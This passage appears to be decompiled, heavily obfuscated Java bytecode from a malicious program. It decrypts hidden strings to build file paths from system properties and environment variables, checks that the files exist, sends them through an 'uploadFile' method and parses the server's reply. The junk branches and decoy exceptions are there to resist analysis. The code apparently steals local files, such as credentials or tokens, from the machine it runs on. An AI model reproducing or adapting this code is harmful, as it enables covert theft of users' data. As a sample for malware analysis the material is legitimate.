    //   1598: iushr
    //   1599: iload #145
    //   1601: irem
    //   1602: iload #145
    //   1604: bipush #16
    //   1606: iushr
    //   1607: ixor
    //   1608: ldc_w 24009049
    //   1611: if_icmpne -> 1625
    //   1614: ldc_w 927344984
    //   1617: iload #145
    //   1619: ixor
    //   1620: istore #145
    //   1622: goto -> 1695
    //   1625: new java/lang/IllegalAccessException
    //   1628: astore_3
    //   1629: aload_3
    //   1630: invokespecial <init> : ()V
    //   1633: aload_3
    //   1634: athrow
    //   1635: new java/lang/RuntimeException
    //   1638: astore_3
    //   1639: aload_3
    //   1640: invokespecial <init> : ()V
    //   1643: aload_3
    //   1644: athrow
    //   1645: new java/lang/RuntimeException
    //   1648: astore_3
    //   1649: aload_3
    //   1650: invokespecial <init> : ()V
    //   1653: aload_3
    //   1654: athrow
    //   1655: new java/lang/RuntimeException
    //   1658: astore_3
    //   1659: aload_3
    //   1660: ldc 'Error in hash'
    //   1662: invokespecial <init> : (Ljava/lang/String;)V
    //   1665: aload_3
    //   1666: athrow
    //   1667: nop
    //   1668: nop
    //   1669: nop
    //   1670: athrow
    //   1671: nop
    //   1672: nop
    //   1673: nop
    //   1674: nop
    //   1675: nop
    //   1676: athrow
    //   1677: nop
    //   1678: nop
    //   1679: nop
    //   1680: athrow
    //   1681: nop
    //   1682: nop
    //   1683: nop
    //   1684: nop
    //   1685: nop
    //   1686: athrow
    //   1687: ldc_w 1771742340
    //   1690: iload #145
    //   1692: ixor
    //   1693: istore #145
    //   1695: new java/io/File
    //   1698: astore #15
    //   1700: new java/lang/StringBuilder
    //   1703: astore #109
    //   1705: aload #109
    //   1707: invokespecial <init> : ()V
    //   1710: ldc_w 'TwRwOEwqdk1D'
    //   1713: iload #145
    //   1715: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   1718: astore #137
    //   1720: aload #137
    //   1722: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   1725: astore #138
    //   1727: aload #109
    //   1729: aload #138
    //   1731: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1734: astore #110
    //   1736: ldc_w 'ZllzLwM2cUVUUAxHXARkVFF0K3oAX3s='
    //   1739: iload #145
    //   1741: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   1744: astore #139
    //   1746: aload #110
    //   1748: aload #139
    //   1750: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1753: astore #111
    //   1755: aload #111
    //   1757: invokevirtual toString : ()Ljava/lang/String;
    //   1760: astore #112
    //   1762: aload #15
    //   1764: aload #112
    //   1766: invokespecial <init> : (Ljava/lang/String;)V
    //   1769: aload #15
    //   1771: invokevirtual exists : ()Z
    //   1774: istore #16
    //   1776: iload #16
    //   1778: ldc_w 1825945344
    //   1781: iload #145
    //   1783: ixor
    //   1784: if_icmpeq -> 3093
    //   1787: iload #145
    //   1789: bipush #31
    //   1791: imul
    //   1792: iconst_4
    //   1793: iushr
    //   1794: iload #145
    //   1796: irem
    //   1797: iload #145
    //   1799: bipush #16
    //   1801: iushr
    //   1802: ixor
    //   1803: ldc_w 48135749
    //   1806: if_icmpne -> 3083
    //   1809: ldc_w 2116578518
    //   1812: iload #145
    //   1814: ixor
    //   1815: istore #145
    //   1817: iload #145
    //   1819: ldc_w 318626761
    //   1822: iload #145
    //   1824: ixor
    //   1825: imul
    //   1826: ldc_w 318626770
    //   1829: iload #145
    //   1831: ixor
    //   1832: iushr
    //   1833: iload #145
    //   1835: irem
    //   1836: iload #145
    //   1838: ldc_w 318626758
    //   1841: iload #145
    //   1843: ixor
    //   1844: iushr
    //   1845: ixor
    //   1846: ldc_w 372641989
    //   1849: iload #145
    //   1851: ixor
    //   1852: if_icmpeq -> 1879
    //   1855: aconst_null
    //   1856: athrow
    //   1857: nop
    //   1858: nop
    //   1859: nop
    //   1860: nop
    //   1861: nop
    //   1862: nop
    //   1863: nop
    //   1864: nop
    //   1865: nop
    //   1866: nop
    //   1867: nop
    //   1868: nop
    //   1869: nop
    //   1870: nop
    //   1871: nop
    //   1872: nop
    //   1873: nop
    //   1874: nop
    //   1875: nop
    //   1876: nop
    //   1877: nop
    //   1878: athrow
    //   1879: new java/io/IOException
    //   1882: dup
    //   1883: invokespecial <init> : ()V
    //   1886: athrow
    //   1887: nop
    //   1888: nop
    //   1889: nop
    //   1890: nop
    //   1891: nop
    //   1892: nop
    //   1893: nop
    //   1894: nop
    //   1895: nop
    //   1896: nop
    //   1897: nop
    //   1898: nop
    //   1899: nop
    //   1900: nop
    //   1901: nop
    //   1902: nop
    //   1903: nop
    //   1904: nop
    //   1905: nop
    //   1906: nop
    //   1907: nop
    //   1908: athrow
    //   1909: nop
    //   1910: nop
    //   1911: nop
    //   1912: athrow
    //   1913: nop
    //   1914: nop
    //   1915: nop
    //   1916: nop
    //   1917: nop
    //   1918: athrow
    //   1919: iload #145
    //   1921: bipush #7
    //   1923: bipush #29
    //   1925: ishl
    //   1926: iand
    //   1927: bipush #29
    //   1929: ishr
    //   1930: iload #145
    //   1932: iconst_3
    //   1933: ishl
    //   1934: ior
    //   1935: lookupswitch default -> 1960, -1745953104 -> 1972, 192989979 -> 1983
    //   1960: new java/lang/RuntimeException
    //   1963: astore_3
    //   1964: aload_3
    //   1965: ldc 'Error in hash'
    //   1967: invokespecial <init> : (Ljava/lang/String;)V
    //   1970: aload_3
    //   1971: athrow
    //   1972: ldc_w 858362005
    //   1975: iload #145
    //   1977: ixor
    //   1978: istore #145
    //   1980: goto -> 1991
    //   1983: ldc_w 1084510752
    //   1986: iload #145
    //   1988: ixor
    //   1989: istore #145
    //   1991: pop
    //   1992: iload #145
    //   1994: bipush #31
    //   1996: imul
    //   1997: iconst_4
    //   1998: iushr
    //   1999: iload #145
    //   2001: irem
    //   2002: iload #145
    //   2004: bipush #16
    //   2006: iushr
    //   2007: ixor
    //   2008: ldc_w 25915397
    //   2011: if_icmpne -> 3063
    //   2014: ldc_w 1676378075
    //   2017: iload #145
    //   2019: ixor
    //   2020: istore #145
    //   2022: aload_0
    //   2023: astore #17
    //   2025: new java/lang/StringBuilder
    //   2028: astore #64
    //   2030: aload #64
    //   2032: invokespecial <init> : ()V
    //   2035: ldc_w 'Tw1zPEEte0pP'
    //   2038: iload #145
    //   2040: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2043: astore #113
    //   2045: aload #113
    //   2047: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   2050: astore #114
    //   2052: aload #64
    //   2054: aload #114
    //   2056: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   2059: astore #65
    //   2061: ldc_w 'ZlBwKw4xfEJYXAxOXwBpU1xzJ3YAVng='
    //   2064: iload #145
    //   2066: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2069: astore #115
    //   2071: aload #65
    //   2073: aload #115
    //   2075: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   2078: astore #66
    //   2080: aload #66
    //   2082: invokevirtual toString : ()Ljava/lang/String;
    //   2085: astore #67
    //   2087: aload #17
    //   2089: aload #67
    //   2091: ldc_w 2128534674
    //   2094: iload #145
    //   2096: ixor
    //   2097: invokevirtual uploadFile : (Ljava/lang/String;I)Ljava/lang/String;
    //   2100: astore #18
    //   2102: ldc_w 'fB9/IgohNFNFIAJdWQEzT01hbQ=='
    //   2105: iload #145
    //   2107: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2110: astore #68
    //   2112: aload #18
    //   2114: aload #68
    //   2116: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   2119: istore #19
    //   2121: iload #19
    //   2123: ldc_w 1111438488
    //   2126: iload #145
    //   2128: ixor
    //   2129: if_icmpeq -> 2706
    //   2132: iload #145
    //   2134: bipush #31
    //   2136: imul
    //   2137: iconst_4
    //   2138: iushr
    //   2139: iload #145
    //   2141: irem
    //   2142: iload #145
    //   2144: bipush #16
    //   2146: iushr
    //   2147: ixor
    //   2148: ldc_w 5912537
    //   2151: if_icmpne -> 3053
    //   2154: ldc_w 1765356695
    //   2157: iload #145
    //   2159: ixor
    //   2160: istore #145
    //   2162: iload #145
    //   2164: ldc_w 721813520
    //   2167: iload #145
    //   2169: ixor
    //   2170: imul
    //   2171: ldc_w 721813515
    //   2174: iload #145
    //   2176: ixor
    //   2177: iushr
    //   2178: iload #145
    //   2180: irem
    //   2181: iload #145
    //   2183: ldc_w 721813535
    //   2186: iload #145
    //   2188: ixor
    //   2189: iushr
    //   2190: ixor
    //   2191: ldc_w 677219092
    //   2194: iload #145
    //   2196: ixor
    //   2197: if_icmpeq -> 2224
    //   2200: aconst_null
    //   2201: athrow
    //   2202: nop
    //   2203: nop
    //   2204: nop
    //   2205: nop
    //   2206: nop
    //   2207: nop
    //   2208: nop
    //   2209: nop
    //   2210: nop
    //   2211: nop
    //   2212: nop
    //   2213: nop
    //   2214: nop
    //   2215: nop
    //   2216: nop
    //   2217: nop
    //   2218: nop
    //   2219: nop
    //   2220: nop
    //   2221: nop
    //   2222: nop
    //   2223: athrow
    //   2224: new java/io/IOException
    //   2227: dup
    //   2228: invokespecial <init> : ()V
    //   2231: athrow
    //   2232: nop
    //   2233: nop
    //   2234: nop
    //   2235: nop
    //   2236: nop
    //   2237: nop
    //   2238: nop
    //   2239: nop
    //   2240: nop
    //   2241: nop
    //   2242: nop
    //   2243: nop
    //   2244: nop
    //   2245: nop
    //   2246: nop
    //   2247: nop
    //   2248: nop
    //   2249: nop
    //   2250: nop
    //   2251: nop
    //   2252: nop
    //   2253: athrow
    //   2254: nop
    //   2255: nop
    //   2256: nop
    //   2257: athrow
    //   2258: nop
    //   2259: nop
    //   2260: nop
    //   2261: nop
    //   2262: nop
    //   2263: athrow
    //   2264: iload #145
    //   2266: bipush #7
    //   2268: bipush #29
    //   2270: ishl
    //   2271: iand
    //   2272: bipush #29
    //   2274: ishr
    //   2275: iload #145
    //   2277: iconst_3
    //   2278: ishl
    //   2279: ior
    //   2280: lookupswitch default -> 2330, -1981597262 -> 2308, 1479540857 -> 2319
    //   2308: ldc_w 1349615054
    //   2311: iload #145
    //   2313: ixor
    //   2314: istore #145
    //   2316: goto -> 2342
    //   2319: ldc_w 709565175
    //   2322: iload #145
    //   2324: ixor
    //   2325: istore #145
    //   2327: goto -> 2342
    //   2330: new java/lang/RuntimeException
    //   2333: astore_3
    //   2334: aload_3
    //   2335: ldc 'Error in hash'
    //   2337: invokespecial <init> : (Ljava/lang/String;)V
    //   2340: aload_3
    //   2341: athrow
    //   2342: pop
    //   2343: iload #145
    //   2345: bipush #31
    //   2347: imul
    //   2348: iconst_4
    //   2349: iushr
    //   2350: iload #145
    //   2352: irem
    //   2353: iload #145
    //   2355: bipush #16
    //   2357: iushr
    //   2358: ixor
    //   2359: ldc_w 20465669
    //   2362: if_icmpne -> 2686
    //   2365: ldc_w 2133372572
    //   2368: iload #145
    //   2370: ixor
    //   2371: istore #145
    //   2373: ldc_w 'WhFgIwohP1IBZR5IUU57Xkhk'
    //   2376: iload #145
    //   2378: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2381: astore #69
    //   2383: aload #18
    //   2385: aload #69
    //   2387: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   2390: istore #20
    //   2392: iload #20
    //   2394: ldc_w 2120594532
    //   2397: iload #145
    //   2399: ixor
    //   2400: if_icmpne -> 2675
    //   2403: iload #145
    //   2405: bipush #31
    //   2407: imul
    //   2408: iconst_4
    //   2409: iushr
    //   2410: iload #145
    //   2412: irem
    //   2413: iload #145
    //   2415: bipush #16
    //   2417: iushr
    //   2418: ixor
    //   2419: ldc_w 82146276
    //   2422: if_icmpne -> 2436
    //   2425: ldc_w 1771560585
    //   2428: iload #145
    //   2430: ixor
    //   2431: istore #145
    //   2433: goto -> 2446
    //   2436: new java/lang/IllegalAccessException
    //   2439: astore_3
    //   2440: aload_3
    //   2441: invokespecial <init> : ()V
    //   2444: aload_3
    //   2445: athrow
    //   2446: iload #145
    //   2448: ldc_w 401763058
    //   2451: iload #145
    //   2453: ixor
    //   2454: imul
    //   2455: ldc_w 401763049
    //   2458: iload #145
    //   2460: ixor
    //   2461: iushr
    //   2462: iload #145
    //   2464: irem
    //   2465: iload #145
    //   2467: ldc_w 401763069
    //   2470: iload #145
    //   2472: ixor
    //   2473: iushr
    //   2474: ixor
    //   2475: ldc_w 429380148
    //   2478: iload #145
    //   2480: ixor
    //   2481: if_icmpeq -> 2508
    //   2484: aconst_null
    //   2485: athrow
    //   2486: nop
    //   2487: nop
    //   2488: nop
    //   2489: nop
    //   2490: nop
    //   2491: nop
    //   2492: nop
    //   2493: nop
    //   2494: nop
    //   2495: nop
    //   2496: nop
    //   2497: nop
    //   2498: nop
    //   2499: nop
    //   2500: nop
    //   2501: nop
    //   2502: nop
    //   2503: nop
    //   2504: nop
    //   2505: nop
    //   2506: nop
    //   2507: athrow
    //   2508: new java/io/IOException
    //   2511: dup
    //   2512: invokespecial <init> : ()V
    //   2515: athrow
    //   2516: nop
    //   2517: nop
    //   2518: nop
    //   2519: nop
    //   2520: nop
    //   2521: nop
    //   2522: nop
    //   2523: nop
    //   2524: nop
    //   2525: nop
    //   2526: nop
    //   2527: nop
    //   2528: nop
    //   2529: nop
    //   2530: nop
    //   2531: nop
    //   2532: nop
    //   2533: nop
    //   2534: nop
    //   2535: nop
    //   2536: nop
    //   2537: athrow
    //   2538: iload #145
    //   2540: bipush #7
    //   2542: bipush #29
    //   2544: ishl
    //   2545: iand
    //   2546: bipush #29
    //   2548: ishr
    //   2549: iload #145
    //   2551: iconst_3
    //   2552: ishl
    //   2553: ior
    //   2554: lookupswitch default -> 2591, -1080862872 -> 2603, 1531528497 -> 2580
    //   2580: ldc_w 1778838034
    //   2583: iload #145
    //   2585: ixor
    //   2586: istore #145
    //   2588: goto -> 2611
    //   2591: new java/lang/RuntimeException
    //   2594: astore_3
    //   2595: aload_3
    //   2596: ldc 'Error in hash'
    //   2598: invokespecial <init> : (Ljava/lang/String;)V
    //   2601: aload_3
    //   2602: athrow
    //   2603: ldc_w 1453172825
    //   2606: iload #145
    //   2608: ixor
    //   2609: istore #145
    //   2611: pop
    //   2612: iload #145
    //   2614: bipush #31
    //   2616: imul
    //   2617: iconst_4
    //   2618: iushr
    //   2619: iload #145
    //   2621: irem
    //   2622: iload #145
    //   2624: bipush #16
    //   2626: iushr
    //   2627: ixor
    //   2628: ldc_w 248039507
    //   2631: if_icmpne -> 2645
    //   2634: ldc_w 268088139
    //   2637: iload #145
    //   2639: ixor
    //   2640: istore #145
    //   2642: goto -> 2714
    //   2645: new java/lang/RuntimeException
    //   2648: astore_3
    //   2649: aload_3
    //   2650: invokespecial <init> : ()V
    //   2653: aload_3
    //   2654: athrow
    //   2655: nop
    //   2656: nop
    //   2657: nop
    //   2658: athrow
    //   2659: nop
    //   2660: nop
    //   2661: nop
    //   2662: nop
    //   2663: nop
    //   2664: athrow
    //   2665: nop
    //   2666: nop
    //   2667: nop
    //   2668: athrow
    //   2669: nop
    //   2670: nop
    //   2671: nop
    //   2672: nop
    //   2673: nop
    //   2674: athrow
    //   2675: ldc_w 432702139
    //   2678: iload #145
    //   2680: ixor
    //   2681: istore #145
    //   2683: goto -> 3101
    //   2686: new java/lang/IllegalAccessException
    //   2689: astore_3
    //   2690: aload_3
    //   2691: invokespecial <init> : ()V
    //   2694: aload_3
    //   2695: athrow
    //   2696: nop
    //   2697: nop
    //   2698: nop
    //   2699: athrow
    //   2700: nop
    //   2701: nop
    //   2702: nop
    //   2703: nop
    //   2704: nop
    //   2705: athrow
    //   2706: ldc_w 212485479
    //   2709: iload #145
    //   2711: ixor
    //   2712: istore #145
    //   2714: ldc_w 'VhV4LE19OA=='
    //   2717: iload #145
    //   2719: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2722: astore #70
    //   2724: aload #18
    //   2726: aload #70
    //   2728: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   2731: astore #21
    //   2733: ldc_w 1318416894
    //   2736: iload #145
    //   2738: ixor
    //   2739: i2b
    //   2740: istore #71
    //   2742: aload #21
    //   2744: iload #71
    //   2746: aaload
    //   2747: astore #22
    //   2749: ldc_w 'GA=='
    //   2752: iload #145
    //   2754: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   2757: astore #72
    //   2759: aload #22
    //   2761: aload #72
    //   2763: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   2766: astore #23
    //   2768: ldc_w 1318416895
    //   2771: iload #145
    //   2773: ixor
    //   2774: i2b
    //   2775: istore #73
    //   2777: aload #23
    //   2779: iload #73
    //   2781: aaload
    //   2782: astore #4
    //   2784: iload #145
    //   2786: bipush #31
    //   2788: imul
    //   2789: iconst_4
    //   2790: iushr
    //   2791: iload #145
    //   2793: irem
    //   2794: iload #145
    //   2796: bipush #16
    //   2798: iushr
    //   2799: ixor
    //   2800: ldc_w 138527307
    //   2803: if_icmpne -> 3043
    //   2806: ldc_w 1479370019
    //   2809: iload #145
    //   2811: ixor
    //   2812: istore #145
    //   2814: iload #145
    //   2816: ldc_w 381162691
    //   2819: iload #145
    //   2821: ixor
    //   2822: imul
    //   2823: ldc_w 381162712
    //   2826: iload #145
    //   2828: ixor
    //   2829: iushr
    //   2830: iload #145
    //   2832: irem
    //   2833: iload #145
    //   2835: ldc_w 381162700
    //   2838: iload #145
    //   2840: ixor
    //   2841: iushr
    //   2842: ixor
    //   2843: ldc_w 448571918
    //   2846: iload #145
    //   2848: ixor
    //   2849: if_icmpeq -> 2876
    //   2852: aconst_null
    //   2853: athrow
    //   2854: nop
    //   2855: nop
    //   2856: nop
    //   2857: nop
    //   2858: nop
    //   2859: nop
    //   2860: nop
    //   2861: nop
    //   2862: nop
    //   2863: nop
    //   2864: nop
    //   2865: nop
    //   2866: nop
    //   2867: nop
    //   2868: nop
    //   2869: nop
    //   2870: nop
    //   2871: nop
    //   2872: nop
    //   2873: nop
    //   2874: nop
    //   2875: athrow
    //   2876: new java/lang/IllegalAccessException
    //   2879: dup
    //   2880: invokespecial <init> : ()V
    //   2883: athrow
    //   2884: nop
    //   2885: nop
    //   2886: nop
    //   2887: nop
    //   2888: nop
    //   2889: nop
    //   2890: nop
    //   2891: nop
    //   2892: nop
    //   2893: nop
    //   2894: nop
    //   2895: nop
    //   2896: nop
    //   2897: nop
    //   2898: nop
    //   2899: nop
    //   2900: nop
    //   2901: nop
    //   2902: nop
    //   2903: nop
    //   2904: nop
    //   2905: athrow
    //   2906: nop
    //   2907: nop
    //   2908: nop
    //   2909: athrow
    //   2910: nop
    //   2911: nop
    //   2912: nop
    //   2913: nop
    //   2914: nop
    //   2915: athrow
    //   2916: nop
    //   2917: nop
    //   2918: nop
    //   2919: athrow
    //   2920: nop
    //   2921: nop
    //   2922: nop
    //   2923: nop
    //   2924: nop
    //   2925: athrow
    //   2926: iload #145
    //   2928: bipush #7
    //   2930: bipush #29
    //   2932: ishl
    //   2933: iand
    //   2934: bipush #29
    //   2936: ishr
    //   2937: iload #145
    //   2939: iconst_3
    //   2940: ishl
    //   2941: ior
    //   2942: lookupswitch default -> 2968, -1245665568 -> 2980, -1048585622 -> 2991
    //   2968: new java/lang/IllegalAccessException
    //   2971: astore_3
    //   2972: aload_3
    //   2973: ldc 'Error in hash'
    //   2975: invokespecial <init> : (Ljava/lang/String;)V
    //   2978: aload_3
    //   2979: athrow
    //   2980: ldc_w 840602225
    //   2983: iload #145
    //   2985: ixor
    //   2986: istore #145
    //   2988: goto -> 2999
    //   2991: ldc_w 2089647584
    //   2994: iload #145
    //   2996: ixor
    //   2997: istore #145
    //   2999: pop
    //   3000: iload #145
    //   3002: bipush #31
    //   3004: imul
    //   3005: iconst_4
    //   3006: iushr
    //   3007: iload #145
    //   3009: irem
    //   3010: iload #145
    //   3012: bipush #16
    //   3014: iushr
    //   3015: ixor
    //   3016: ldc_w 117096525
    //   3019: if_icmpne -> 3033
    //   3022: ldc_w 1124970610
    //   3025: iload #145
    //   3027: ixor
    //   3028: istore #145
    //   3030: goto -> 3101
    //   3033: new java/lang/IllegalAccessException
    //   3036: astore_3
    //   3037: aload_3
    //   3038: invokespecial <init> : ()V
    //   3041: aload_3
    //   3042: athrow
    //   3043: new java/io/IOException
    //   3046: astore_3
    //   3047: aload_3
    //   3048: invokespecial <init> : ()V
    //   3051: aload_3
    //   3052: athrow
    //   3053: new java/lang/RuntimeException
    //   3056: astore_3
    //   3057: aload_3
    //   3058: invokespecial <init> : ()V
    //   3061: aload_3
    //   3062: athrow
    //   3063: new java/io/IOException
    //   3066: astore_3
    //   3067: aload_3
    //   3068: invokespecial <init> : ()V
    //   3071: aload_3
    //   3072: athrow
    //   3073: nop
    //   3074: nop
    //   3075: nop
    //   3076: athrow
    //   3077: nop
    //   3078: nop
    //   3079: nop
    //   3080: nop
    //   3081: nop
    //   3082: athrow
    //   3083: new java/lang/IllegalAccessException
    //   3086: astore_3
    //   3087: aload_3
    //   3088: invokespecial <init> : ()V
    //   3091: aload_3
    //   3092: athrow
    //   3093: ldc_w 192578015
    //   3096: iload #145
    //   3098: ixor
    //   3099: istore #145
    //   3101: new java/io/File
    //   3104: astore #24
    //   3106: new java/lang/StringBuilder
    //   3109: astore #116
    //   3111: aload #116
    //   3113: invokespecial <init> : ()V
    //   3116: ldc_w 'eyhEAi8RWw=='
    //   3119: iload #145
    //   3121: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3124: astore #140
    //   3126: aload #140
    //   3128: invokestatic getenv : (Ljava/lang/String;)Ljava/lang/String;
    //   3131: astore #141
    //   3133: aload #116
    //   3135: aload #141
    //   3137: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   3140: astore #117
    //   3142: ldc_w 'ZlZ5LwAgeVFKaxl3WxRuWEhwYXAfY3lbVB1/KD0ifkdOdAdbSEB7SE5t'
    //   3145: iload #145
    //   3147: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3150: astore #142
    //   3152: aload #117
    //   3154: aload #142
    //   3156: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   3159: astore #118
    //   3161: aload #118
    //   3163: invokevirtual toString : ()Ljava/lang/String;
    //   3166: astore #119
    //   3168: aload #24
    //   3170: aload #119
    //   3172: invokespecial <init> : (Ljava/lang/String;)V
    //   3175: aload #24
    //   3177: invokevirtual exists : ()Z
    //   3180: istore #25
    //   3182: iload #25
    //   3184: ldc_w 1739536095
    //   3187: iload #145
    //   3189: ixor
    //   3190: if_icmpeq -> 3236
    //   3193: iload #145
    //   3195: bipush #31
    //   3197: imul
    //   3198: iconst_4
    //   3199: iushr
    //   3200: iload #145
    //   3202: irem
    //   3203: iload #145
    //   3205: bipush #16
    //   3207: iushr
    //   3208: ixor
    //   3209: ldc_w 149102079
    //   3212: if_icmpne -> 3226
    //   3215: ldc_w 225755587
    //   3218: iload #145
    //   3220: ixor
    //   3221: istore #145
    //   3223: goto -> 3247
    //   3226: new java/lang/RuntimeException
    //   3229: astore_3
    //   3230: aload_3
    //   3231: invokespecial <init> : ()V
    //   3234: aload_3
    //   3235: athrow
    //   3236: ldc_w 1406992461
    //   3239: iload #145
    //   3241: ixor
    //   3242: istore #145
    //   3244: goto -> 4426
    //   3247: iload #145
    //   3249: ldc_w 1792800515
    //   3252: iload #145
    //   3254: ixor
    //   3255: imul
    //   3256: ldc_w 1792800536
    //   3259: iload #145
    //   3261: ixor
    //   3262: iushr
    //   3263: iload #145
    //   3265: irem
    //   3266: iload #145
    //   3268: ldc_w 1792800524
    //   3271: iload #145
    //   3273: ixor
    //   3274: iushr
    //   3275: ixor
    //   3276: ldc_w 1708241665
    //   3279: iload #145
    //   3281: ixor
    //   3282: if_icmpeq -> 3309
    //   3285: aconst_null
    //   3286: athrow
    //   3287: nop
    //   3288: nop
    //   3289: nop
    //   3290: nop
    //   3291: nop
    //   3292: nop
    //   3293: nop
    //   3294: nop
    //   3295: nop
    //   3296: nop
    //   3297: nop
    //   3298: nop
    //   3299: nop
    //   3300: nop
    //   3301: nop
    //   3302: nop
    //   3303: nop
    //   3304: nop
    //   3305: nop
    //   3306: nop
    //   3307: nop
    //   3308: athrow
    //   3309: new java/io/IOException
    //   3312: dup
    //   3313: invokespecial <init> : ()V
    //   3316: athrow
    //   3317: nop
    //   3318: nop
    //   3319: nop
    //   3320: nop
    //   3321: nop
    //   3322: nop
    //   3323: nop
    //   3324: nop
    //   3325: nop
    //   3326: nop
    //   3327: nop
    //   3328: nop
    //   3329: nop
    //   3330: nop
    //   3331: nop
    //   3332: nop
    //   3333: nop
    //   3334: nop
    //   3335: nop
    //   3336: nop
    //   3337: nop
    //   3338: athrow
    //   3339: iload #145
    //   3341: bipush #7
    //   3343: bipush #29
    //   3345: ishl
    //   3346: iand
    //   3347: bipush #29
    //   3349: ishr
    //   3350: iload #145
    //   3352: iconst_3
    //   3353: ishl
    //   3354: ior
    //   3355: lookupswitch default -> 7196, -545751200 -> 3380, 1457502435 -> 3391
    //   3380: ldc_w 1612554154
    //   3383: iload #145
    //   3385: ixor
    //   3386: istore #145
    //   3388: goto -> 3399
    //   3391: ldc_w 287926106
    //   3394: iload #145
    //   3396: ixor
    //   3397: istore #145
    //   3399: pop
    //   3400: iload #145
    //   3402: bipush #31
    //   3404: imul
    //   3405: iconst_4
    //   3406: iushr
    //   3407: iload #145
    //   3409: irem
    //   3410: iload #145
    //   3412: bipush #16
    //   3414: iushr
    //   3415: ixor
    //   3416: ldc_w 2460789
    //   3419: if_icmpne -> 7186
    //   3422: ldc_w 1637759792
    //   3425: iload #145
    //   3427: ixor
    //   3428: istore #145
    //   3430: aload_0
    //   3431: astore #26
    //   3433: new java/lang/StringBuilder
    //   3436: astore #74
    //   3438: aload #74
    //   3440: invokespecial <init> : ()V
    //   3443: ldc_w 'fitECCgbXg=='
    //   3446: iload #145
    //   3448: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3451: astore #120
    //   3453: aload #120
    //   3455: invokestatic getenv : (Ljava/lang/String;)Ljava/lang/String;
    //   3458: astore #121
    //   3460: aload #74
    //   3462: aload #121
    //   3464: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   3467: astore #75
    //   3469: ldc_w 'Y1V5JQcqfFhLahxzWx9iWEd4bHEdZ3hbUhdxLDAkfEJEfgtQSkRxTk1j'
    //   3472: iload #145
    //   3474: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3477: astore #122
    //   3479: aload #75
    //   3481: aload #122
    //   3483: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   3486: astore #76
    //   3488: aload #76
    //   3490: invokevirtual toString : ()Ljava/lang/String;
    //   3493: astore #77
    //   3495: aload #26
    //   3497: aload #77
    //   3499: ldc_w 646792060
    //   3502: iload #145
    //   3504: ixor
    //   3505: invokevirtual uploadFile : (Ljava/lang/String;I)Ljava/lang/String;
    //   3508: astore #27
    //   3510: ldc_w 'eRp9IAwrP15FLAdfWwI+T0xtYQ=='
    //   3513: iload #145
    //   3515: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   3518: astore #78
    //   3520: aload #27
    //   3522: aload #78
    //   3524: invokevirtual contains : (Ljava/lang/CharSequence;)Z
    //   3527: istore #28
    //   3529: iload #28
    //   3531: ldc_w 443329398
    //   3534: iload #145
    //   3536: ixor
    //   3537: if_icmpeq -> 4122
    //   3540: iload #145
    //   3542: bipush #31
    //   3544: imul
    //   3545: iconst_4
    //   3546: iushr
    //   3547: iload #145
    //   3549: irem
    //   3550: iload #145
    //   3552: bipush #16
    //   3554: iushr
    //   3555: ixor
    //   3556: ldc_w 53646936
    //   3559: if_icmpne -> 3573
    //   3562: ldc_w 776646544
    //   3565: iload #145
    //   3567: ixor
    //   3568: istore #145
    //   3570: goto -> 3583
    //   3573: new java/lang/RuntimeException
    //   3576: astore_3
    //   3577: aload_3
    //   3578: invokespecial <init> : ()V
    //   3581: aload_3
    //   3582: athrow
    //   3583: iload #145
    //   3585: ldc_w 874906873
    //   3588: iload #145
    //   3590: ixor
    //   3591: imul
    //   3592: ldc_w 874906850
    //   3595: iload #145
    //   3597: ixor
    //   3598: iushr
    //   3599: iload #145
    //   3601: irem
    //   3602: iload #145
    //   3604: ldc_w 874906870
    //   3607: iload #145
    //   3609: ixor
    //   3610: iushr
    //   3611: ixor
    //   3612: ldc_w 825203133
    //   3615: iload #145
    //   3617: ixor
    //   3618: if_icmpeq -> 3645
    //   3621: aconst_null
    //   3622: athrow
    //   3623: nop
    //   3624: nop
    //   3625: nop
    //   3626: nop
    //   3627: nop
    //   3628: nop
    //   3629: nop
    //   3630: nop
    //   3631: nop
    //   3632: nop
    //   3633: nop
    //   3634: nop
    //   3635: nop
    //   3636: nop
    //   3637: nop
    //   3638: nop
    //   3639: nop
    //   3640: nop
    //   3641: nop
    //   3642: nop
    //   3643: nop
    //   3644: athrow
    //   3645: new java/lang/IllegalAccessException
    //   3648: dup
    //   3649: invokespecial <init> : ()V
    //   3652: athrow
    //   3653: nop
    //   3654: nop
    //   3655: nop
    //   3656: nop
    //   3657: nop
    //   3658: nop
